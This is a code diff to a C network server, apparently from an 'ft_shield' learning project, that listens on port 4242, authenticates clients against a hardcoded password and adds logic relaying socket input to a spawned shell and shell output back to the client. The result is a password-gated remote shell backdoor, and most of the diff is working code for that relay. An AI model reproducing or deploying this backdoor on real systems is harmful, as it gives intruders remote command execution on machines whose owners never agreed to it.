@@ -1,5 +1,4 @@
 #include "server.h"
-#include "ft_shield.h"
 
 int get_client_index(int fd, t_clients *clients)
 {
@@ -26,6 +25,36 @@ bool is_auth(int fd, t_clients *clients)
 	if (index == -1)
 		return false;
 	if (clients->auth[index] == 1)
+		return true;
+	return false;
+}
+
+int is_shell_running(int fd, t_clients *clients)
+{
+	int index = get_client_index(fd, clients);
+	if (index == -1)
+		return false;
+	if (clients->active[index] == 1)
+		return true;
+	return false;
+}
+
+int get_index_shellfd(int fd, t_clients *clients)
+{
+	for (int i = 0; i < MAX_CLIENT; i++)
+	{
+		if (clients->from_shell[i] == fd)
+			return i;
+	}
+	return -1;
+}
+
+bool is_shell(int fd, t_clients *clients)
+{
+	int index = get_index_shellfd(fd, clients);
+	if (index == -1)
+		return false;
+	if (clients->active[index] == 1)
 		return true;
 	return false;
 }
@@ -85,10 +114,12 @@ void remove_client(int fd, int epollfd, t_clients *clients)
 {
 	int index = get_client_index(fd, clients);
 	if (index == -1)
-		return ;
+		return;
 	printf("closing fd: %d", clients->list[index]);
 	epoll_ctl(epollfd, EPOLL_CTL_DEL, clients->list[index], NULL);
+	epoll_ctl(epollfd, EPOLL_CTL_DEL, clients->from_shell[index], NULL);
 	close(clients->list[index]);
+	close(clients->from_shell[index]);
 	clients->list[index] = 0;
 	clients->auth[index] = 0;
 	clients->num--;
@@ -111,7 +142,7 @@ int check_keycode(int fd, int epollfd, t_clients *clients)
 	int len = read(fd, buffer, sizeof(buffer) - 1);
 	if (len > 0)
 	{
-		process_input(buffer); // if it ends with newline
+		process_input(buffer);			   // if it ends with newline
 		buffer[sizeof(buffer) - 1] = '\0'; // guarantee null termination
 		printf("check_keycode: buffer: %s\n", buffer);
 		if (strcmp(buffer, PASSWORD) == 0)
@@ -145,12 +176,12 @@ int check_keycode(int fd, int epollfd, t_clients *clients)
 
 void server()
 {
-	struct sockaddr_in	server_addr;
+	struct sockaddr_in server_addr;
 	int sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
 	if (sockfd < 0)
 	{
 		printf("sockfd invalid\n");
-		return ;
+		return;
 	}
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(4242);
@@ -160,7 +191,7 @@ void server()
 	if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
 	{
 		printf("bind invalid\n");
-		return ;
+		return;
 	}
 	listen(sockfd, SOCK_MAX);
 	int epollfd = epoll_create1(EPOLL_CLOEXEC);
@@ -170,7 +201,7 @@ void server()
 	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sockfd, &ev) == -1)
 	{
 		printf("epollfd invalid\n");
-		return ;
+		return;
 	}
 	struct epoll_event events[SOCK_MAX];
 	t_clients clients;
@@ -196,7 +227,7 @@ void server()
 					if (cl_state < 0)
 					{
 						printf("socket error\n");
-						return ;
+						return;
 					}
 					if (cl_state == 0)
 					{
@@ -213,7 +244,27 @@ void server()
 					printf("1 auth: %d %d %d\n", clients.auth[0], clients.auth[1], clients.auth[2]);
 					if (is_auth(event_fd, &clients) == 1)
 					{
-						pre_shell(event_fd, epollfd, &clients);
+						if (is_shell_running(event_fd, &clients) == 1)
+						{
+							int index = get_client_index(event_fd, &clients);
+							int to_shell = clients.to_shell[index];
+							char buffer[1024];
+							int size = read(event_fd, buffer, sizeof(buffer));
+							write(to_shell, buffer, size);
+							continue;
+						}
+						else
+							pre_shell(event_fd, epollfd, &clients);
+					}
+					else if (is_shell(event_fd, &clients) == 1)
+					{
+						int index = get_index_shellfd(event_fd, &clients);
+						if (index == -1)
+							continue;
+						char buffer[1024];
+						int size = read(event_fd, buffer, sizeof(buffer));
+						write(clients.list[index], buffer, size);
+						continue;
 					}
 					else
 					{
@@ -224,10 +275,10 @@ void server()
 							{
 								printf("crit: could not find client\n");
 								remove_client(event_fd, epollfd, &clients);
-								continue ;
+								continue;
 							}
 							printf("2 list: %d %d %d\n", clients.list[0], clients.list[1], clients.list[2]);
-							printf("2 auth: %d %d %d\n", clients.auth[0], clients.auth[1], clients.auth[2]);		
+							printf("2 auth: %d %d %d\n", clients.auth[0], clients.auth[1], clients.auth[2]);
 							write(event_fd, "$> ", 3);
 						}
 						else
